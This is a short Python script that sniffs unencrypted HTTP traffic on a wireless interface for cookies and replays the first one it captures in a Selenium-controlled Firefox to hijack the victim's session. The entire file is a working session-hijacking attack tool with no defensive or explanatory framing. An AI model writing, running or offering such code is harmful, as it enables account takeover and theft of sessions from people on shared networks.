from selenium import webdriver
import pyshark
import sys

def start_hijacking():
    cookie = {'name': '', 'value': ''}
    driver = webdriver.Firefox(executable_path='./geckodriver')

    capture = pyshark.LiveCapture(interface='wlp3s0', display_filter='http.cookie')

    for packet in capture.sniff_continuously():
        captured_packet = packet
        break


    cookie['name'], cookie['value'] = (captured_packet.http.cookie).split('=')
    print('captured cookie: ', cookie)

    driver.get('http://' + captured_packet.http.host)
    driver.add_cookie(cookie)
    driver.refresh()


start_hijacking()